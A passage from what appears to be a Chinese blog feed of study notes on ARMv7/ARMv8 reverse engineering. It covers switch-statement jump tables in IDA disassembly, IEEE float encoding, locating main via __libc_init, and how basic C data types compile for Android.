class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 6&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5A4</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_59A</span>                                 <span class="comment">; CODE XREF: main+8↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc8 - <span class="number">0x5A0</span>) <span class="comment">; jumptable 00000574 case 8</span></span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 8&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5A4</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5A0</span>                                 <span class="comment">; CODE XREF: main+8↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc9 - <span class="number">0x5A6</span>) <span class="comment">; jumptable 00000574 case 9</span></span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 9&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5A4</span>                                 <span class="comment">; CODE XREF: main+1A↑j</span></span><br><span class="line">                                        <span class="comment">; main+20↑j ...</span></span><br><span class="line">                <span class="keyword">BLX</span>             printf</span><br><span class="line"></span><br><span class="line"><span class="symbol">def_574</span>                                 <span class="comment">; CODE XREF: main+6↑j</span></span><br><span class="line">                                        <span class="comment">; main+8↑j</span></span><br><span class="line">                <span class="keyword">MOVS</span>            <span class="built_in">R0</span>, <span class="number">#0</span>  <span class="comment">; jumptable 00000574 default case</span></span><br><span class="line">                <span class="keyword">POP</span>             &#123;<span class="built_in">R7</span>,<span class="built_in">PC</span>&#125;</span><br><span class="line"><span class="comment">; End of function main</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">off_5AC</span>         <span class="meta">DCD</span> aArgc9 - <span class="number">0x5A6</span>      <span class="comment">; DATA XREF: main:loc_5A0↑r</span></span><br><span class="line">                                        <span class="comment">; &quot;argc = 9&quot;</span></span><br><span class="line"><span class="symbol">off_5B0</span>         <span class="meta">DCD</span> aArgc8 - <span class="number">0x5A0</span>      <span class="comment">; DATA XREF: main:loc_59A↑r</span></span><br><span class="line">                                        <span class="comment">; &quot;argc = 8&quot;</span></span><br><span class="line"><span class="symbol">off_5B4</span>         <span class="meta">DCD</span> aArgc6 - <span class="number">0x59A</span>      <span class="comment">; DATA XREF: main:loc_594↑r</span></span><br><span class="line">                                        <span class="comment">; &quot;argc = 6&quot;</span></span><br><span class="line"><span class="symbol">off_5B8</span>         <span class="meta">DCD</span> aArgc5 - <span class="number">0x594</span>      <span class="comment">; DATA XREF: main:loc_58E↑r</span></span><br><span class="line">                                        <span class="comment">; &quot;argc = 5&quot;</span></span><br><span class="line"><span class="symbol">off_5BC</span>         <span class="meta">DCD</span> aArgc1 - <span class="number">0x58E</span>      <span class="comment">; DATA XREF: main:loc_588↑r</span></span><br><span class="line">                                        <span class="comment">; &quot;argc = 1&quot;</span></span><br><span class="line"><span class="symbol">off_5C0</span>         <span class="meta">DCD</span> aArgc0 - <span class="number">0x588</span>      <span class="comment">; DATA XREF: main:loc_582↑r</span></span><br><span class="line"><span class="comment">; &#125; // starts at 56C                    ; &quot;argc = 0&quot;</span></span><br></pre></td></tr></table></figure>
<p>在IDA中对应的结构：</p>
<p><img src="/2021-04-18-17-52-51.png"></p>
<h3 id="case后的值间隔较大时"><a href="#case后的值间隔较大时" class="headerlink" title="case后的值间隔较大时"></a>case后的值间隔较大时</h3><p>C语言代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(argc)&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 0&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 30&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">50</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 50&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 80&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 100&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">200</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;argc = 200&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的ARMv7代码：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">                <span class="keyword">PUSH</span>            &#123;<span class="built_in">R7</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line">                <span class="keyword">MOV</span>             <span class="built_in">R7</span>, <span class="built_in">SP</span></span><br><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R0</span>, <span class="number">#79</span></span><br><span class="line">                <span class="keyword">BGT</span>             loc_584</span><br><span class="line">                <span class="keyword">CBZ</span>             <span class="built_in">R0</span>, loc_596</span><br><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R0</span>, <span class="number">#0x1E</span></span><br><span class="line">                <span class="keyword">BEQ</span>             loc_59C</span><br><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R0</span>, <span class="number">#50</span></span><br><span class="line">                <span class="keyword">BNE</span>             loc_5B0</span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc50 - <span class="number">0x584</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 50&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5AC</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_584</span>                                 <span class="comment">; CODE XREF: main+6↑j</span></span><br><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R0</span>, <span class="number">#80</span></span><br><span class="line">                <span class="keyword">BEQ</span>             loc_5A2</span><br><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R0</span>, <span class="number">#100</span></span><br><span class="line">                <span class="keyword">BEQ</span>             loc_5A8</span><br><span class="line">                <span class="keyword">CMP</span>             <span class="built_in">R0</span>, <span class="number">#200</span></span><br><span class="line">                <span class="keyword">BNE</span>             loc_5B0</span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc200 - <span class="number">0x596</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 200&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5AC</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_596</span>                                 <span class="comment">; CODE XREF: main+8↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc0 - <span class="number">0x59C</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 0&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5AC</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_59C</span>                                 <span class="comment">; CODE XREF: main+C↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc30 - <span class="number">0x5A2</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 30&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5AC</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5A2</span>                                 <span class="comment">; CODE XREF: main+1A↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc80 - <span class="number">0x5A8</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 80&quot;</span></span><br><span class="line">                <span class="keyword">B</span>               loc_5AC</span><br><span class="line"><span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5A8</span>                                 <span class="comment">; CODE XREF: main+1E↑j</span></span><br><span class="line">                <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aArgc100 - <span class="number">0x5AE</span>)</span><br><span class="line">                <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>  <span class="comment">; &quot;argc = 100&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5AC</span>                                 <span class="comment">; CODE XREF: main+16↑j</span></span><br><span class="line">                                        <span class="comment">; main+28↑j ...</span></span><br><span class="line">                <span class="keyword">BLX</span>             printf</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_5B0</span>                                 <span class="comment">; CODE XREF: main+10↑j</span></span><br><span class="line">                                        <span class="comment">; main+22↑j</span></span><br><span class="line">                <span class="keyword">MOVS</span>            <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line">                <span class="keyword">POP</span>             &#123;<span class="built_in">R7</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure>
<p>IDA中对应的结构：</p>
<p><img src="/2021-04-18-17-53-22.png"></p>
<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h1 id="ARMv7-异常"><a href="#ARMv7-异常" class="headerlink" title="ARMv7 异常"></a>ARMv7 异常</h1><h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><p>使用下列命令，生产 ARMv8 汇编文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ clang -target aarch64-linux-android21 -S basic.c -o basic64.s</span><br><span class="line">➜ clang -target arm-linux-android21 basic64.s  -o basic64</span><br></pre></td></tr></table></figure>

<p>使用 IDA 查看对应的汇编代码：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span><span class="built_in">D8</span>                 <span class="keyword">SUB</span>             <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x70</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span>DC                 <span class="keyword">MOV</span>             W8, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span>E0                 <span class="keyword">MOV</span>             W9, <span class="number">#0x40F40000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span>E4                 FMOV            <span class="built_in">S0</span>, W9  <span class="comment">; S0 =  7.725f，ARMv8 中直接使用浮点寄存器存储浮点数。</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span>E8                 FMOV            <span class="built_in">S1</span>, <span class="number">#0</span>.<span class="number">625</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span>EC                 <span class="keyword">MOV</span>             W9, <span class="number">#0xC0F40000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span><span class="built_in">F0</span>                 FMOV            <span class="built_in">S2</span>, W9</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span><span class="built_in">F4</span>                 <span class="keyword">MOV</span>             X10, <span class="number">#0x401E800000000000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000000005</span>FC                 FMOV            <span class="built_in">D3</span>, X10</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000600</span>                 FMOV            <span class="built_in">D4</span>, <span class="number">#0</span>.<span class="number">625</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000604</span>                 <span class="keyword">MOV</span>             X10, <span class="number">#0xC01E800000000000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000060</span>C                 FMOV            <span class="built_in">D5</span>, X10</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000610</span>                 <span class="keyword">MOV</span>             W9, <span class="number">#0x61</span> <span class="comment">; &#x27;a&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000614</span>                 <span class="keyword">MOV</span>             W11, <span class="number">#0x109</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000618</span>                 <span class="keyword">MOV</span>             W12, <span class="number">#0x7B</span> <span class="comment">; &#x27;&#123;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000061</span>C                 <span class="keyword">MOV</span>             X10, <span class="number">#0x1C8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000620</span>                 <span class="keyword">MOV</span>             X13, <span class="number">#0x315</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000624</span>                 <span class="keyword">MOV</span>             W14, <span class="number">#0xFEF7</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000628</span>                 <span class="keyword">MOV</span>             W15, <span class="number">#0xFFFFFF85</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000062</span>C                 <span class="keyword">MOV</span>             X16, <span class="number">#0xFFFFFFFFFFFFFE38</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000630</span>                 <span class="keyword">MOV</span>             X17, <span class="number">#0xFFFFFFFFFFFFFCEB</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000634</span>                 <span class="keyword">STR</span>             WZR, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000638</span>                 <span class="keyword">STR</span>             W0, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_8]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000063</span>C                 <span class="keyword">STR</span>             X1, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000640</span>                 <span class="keyword">STR</span>             <span class="built_in">S0</span>, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000644</span>                 <span class="keyword">STR</span>             <span class="built_in">S1</span>, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_18]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000648</span>                 <span class="keyword">STR</span>             <span class="built_in">S2</span>, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_1C]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000064</span>C                 <span class="keyword">STR</span>             <span class="built_in">D3</span>, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_28]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000650</span>                 <span class="keyword">STR</span>             <span class="built_in">D4</span>, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_30]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000654</span>                 <span class="keyword">STR</span>             <span class="built_in">D5</span>, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_38]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000658</span>                 <span class="keyword">STRB</span>            W9, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_39]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000065</span>C                 <span class="keyword">STRH</span>            W11, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_3C]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000660</span>                 <span class="keyword">STR</span>             W12, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_40]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000664</span>                 <span class="keyword">STR</span>             X10, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_48]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000668</span>                 <span class="keyword">STR</span>             X13, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_50]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000066</span>C                 <span class="keyword">STRH</span>            W14, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_52]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000670</span>                 <span class="keyword">STR</span>             W15, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_58]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000674</span>                 <span class="keyword">STR</span>             X16, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_60]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000678</span>                 <span class="keyword">STR</span>             X17, [<span class="built_in">SP</span>,<span class="number">#0x70</span>+var_68]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000067</span>C                 <span class="keyword">MOV</span>             W0, W8</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000680</span>                 <span class="keyword">ADD</span>             <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x70</span> <span class="comment">; &#x27;p&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000000684</span>                 RET</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ARMv8汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>ARMv8学习记录四</title>
    <url>/2021/03/18/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E5%9B%9B/</url>
    <content><![CDATA[<blockquote>
<p>本文主要讲 ARMv7 逆向，下一篇将 ARMv8 逆向。</p>
</blockquote>
<h1 id="IEEE-浮点数"><a href="#IEEE-浮点数" class="headerlink" title="IEEE 浮点数"></a>IEEE 浮点数</h1><p>通常一个浮点数由符号、尾数、基数和指数组成。尾数的位数用于确定精度；指数的位数用于确定能表示的数的范围。</p>
<p>单精度浮点数为 32 位，具有 24 位有效数字，双精度浮点数位 64 位，具有 53 位有效数字。其记录格式如下：</p>
<img src="/2021/03/18/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E5%9B%9B/2021-03-18-19-48-36.png" class="">

<p>单精度：31位为符号位，22<del>30 位为指数位，0</del>22 位为尾数位。其中指数位为指数值加上 127，尾数位为小鼠点后对应的二进制数。</p>
<p>双精度：63位为符号位，51<del>62  位为指数位，0</del>51 位为尾数位。其中指数位为指数值加上 1023，尾数位为小鼠点后对应的二进制数。</p>
<p><strong>例1：</strong> 7.625 浮点数二进制数表示为：</p>
<p>整数部分：111</p>
<p>小数部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0.625 * 2 = 1.25，	整数位为 1 ==&gt; 0.1</span><br><span class="line">0.25 * 2 = 0.5，	整数位为 0 ==&gt; 0.10</span><br><span class="line">0.5 * 2 = 1，		整数位为 1 ==&gt; 0.101</span><br></pre></td></tr></table></figure>
<p>最终结果为 111.101 &#x3D; 1.11101 * 10^2，对应的单精度浮点格式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0   10000001   11101000000000000000000        ==&gt; 0x40F400</span><br><span class="line">--- ------------ -------------------------------</span><br><span class="line">正数  指数为 127+ 2        尾数（小数部分）</span><br></pre></td></tr></table></figure>

<p>对应的双精度浮点格式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0   10000000001    1110100000000000000000000000000000000000000000000000  ==&gt; 0x401E800000000000</span><br><span class="line">--- -------------  ---------------------------------------------------</span><br><span class="line">正数  指数为 1023+2      尾数（小数部分）</span><br></pre></td></tr></table></figure>

<p><strong>例2：</strong> 0.625 的二进制数为 0.101&#x3D; 1.01*10^-1 ；对应的单精度浮点格式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0         01111110         01000000000000000000000    ==&gt; 0x 3F20 0000</span><br><span class="line">----- ----------------    -------------------------------</span><br><span class="line">正数  指数为 127+ (-1)        尾数（小数部分）</span><br></pre></td></tr></table></figure>

<p><strong>例3：</strong> -7.625 的二进制数为 -1.11101*10^2；对应的单精度浮点格式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1   10000001   11101000000000000000000     ==&gt; 0xC0F4 0000</span><br><span class="line">--- ------------ -------------------------------</span><br><span class="line">正数  指数为 127+ 2        尾数（小数部分）</span><br></pre></td></tr></table></figure>

<h1 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h1><p>一般情况下，IDA 会自动将 main 函数标记出来，但是还是有部分应用 IDA 无法自动标记，需要我们手动确认 main 函数。首先找到 start 函数，然后查找 <code>__libc_init</code> 的第 3 个参数 R2，该参数即为 main 函数的地址。</p>
<img src="/2021/03/18/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E5%9B%9B/2021-04-18-16-23-38.png" class="">

<p>可以通过 Android 源码进行验证，在 <a href="http://androidxref.com/">http://androidxref.com/</a> 网站上搜索 <code>__libc_init</code> 调用位置，可以发现其第三个参数为 main 函数的地址。</p>
<img src="/2021/03/18/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E5%9B%9B/2021-04-19-13-14-06.png" class="">



<h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><p>基本数据类型没有什么好说的，下面简单的了解一下就好。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> f1 = <span class="number">7.625f</span>, f2 = <span class="number">0.625f</span>, f3 = <span class="number">-7.625f</span>;</span><br><span class="line">    <span class="type">double</span> d1 = <span class="number">7.625</span>, d2 = <span class="number">0.625</span>, d3 = <span class="number">-7.625</span>;</span><br><span class="line">    <span class="type">char</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> u2 = <span class="number">265</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> u4 = <span class="number">123</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> u8 = <span class="number">456</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> uu8 =<span class="number">789</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">short</span> s2 = <span class="number">-265</span>;</span><br><span class="line">    <span class="type">int</span> i4 = <span class="number">-123</span>;</span><br><span class="line">    <span class="type">long</span> l8 = <span class="number">-456</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ll8 =<span class="number">-789</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用下列命令生成 ARMv7 汇编文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  export PATH=$PATH:$ANDROID_HOME/ndk/21.0.6113669/toolchains/llvm/prebuilt/linux-x86_64/bin</span><br><span class="line">➜  clang -target arm-linux-android21 -S basic.c -o basic.s </span><br><span class="line">➜  clang -target arm-linux-android21 basic.s  -o basic</span><br></pre></td></tr></table></figure>

<p>为了防止被优化，所以没有启动 <code>O2</code> 优化编译选项，因此汇编代码比较冗余。IDA 对应的汇编内容如下。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000039</span>C                 <span class="keyword">SUB</span>             <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x60</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>A0                 <span class="keyword">MOV</span>             <span class="built_in">R2</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">A4</span>                 <span class="keyword">STR</span>             <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>A8                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_8]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>AC                 <span class="keyword">STR</span>             <span class="built_in">R1</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_C]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>B0                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0x40F40000</span> <span class="comment">; R0 = 0x40F40000  =&gt; 7.725f</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>B8                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_10] <span class="comment">; 使用栈空间保存 7.725 , 即局部变量都保存在栈中，下面的操作类似。</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>BC                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0x3F200000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">C4</span>                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">C8</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0xC0F40000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D0</span>                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_18]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D4</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0x401E8000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>DC                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_1C] <span class="comment">; 对应着 double 类型的高32位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E0                 <span class="keyword">STR</span>             <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_20] <span class="comment">; 对应着 double 类型的低32位，即最终值为 0x401E 8000 0000 0000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E4                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0x3FE40000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>EC                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_24]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F0</span>                 <span class="keyword">STR</span>             <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_28]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F4</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0xC01E8000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>FC                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_2C]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000400</span>                 <span class="keyword">STR</span>             <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_30]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000404</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0x61</span> <span class="comment">; &#x27;a&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000408</span>                 <span class="keyword">STRB</span>            <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_31]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000040</span>C                 <span class="keyword">MOV</span>             <span 